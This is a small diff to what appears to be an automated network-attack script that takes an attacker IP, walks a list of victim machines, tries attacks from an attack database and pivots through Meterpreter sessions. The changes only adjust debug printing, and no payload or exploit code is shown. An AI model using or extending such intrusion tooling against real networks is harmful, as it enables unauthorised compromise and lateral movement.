@@ -59,7 +59,6 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
     while(machines):
         #extract the first victim
         target_ip=machines.pop(0)
-        print(target_ip)
         print(f"{C.COL_GREEN} [+] target for this step: {target_ip} {C.COL_RESET}")
 
         attack=list(Attack_DB.attack_dict)
@@ -77,8 +76,6 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                 mc.route_add(met_sess["id_sess"], target_ip)
                 mc.route_print()
                 router=met_sess
-                print("router")
-                print(router)
             else:
                 print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
                 continue
@@ -143,7 +140,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                 continue
             
             session=mc.attempt_attack(attack_obj)
-            #print(attack_obj.output)
+            print(attack_obj.output)
 
             #print(session)
             if(session):
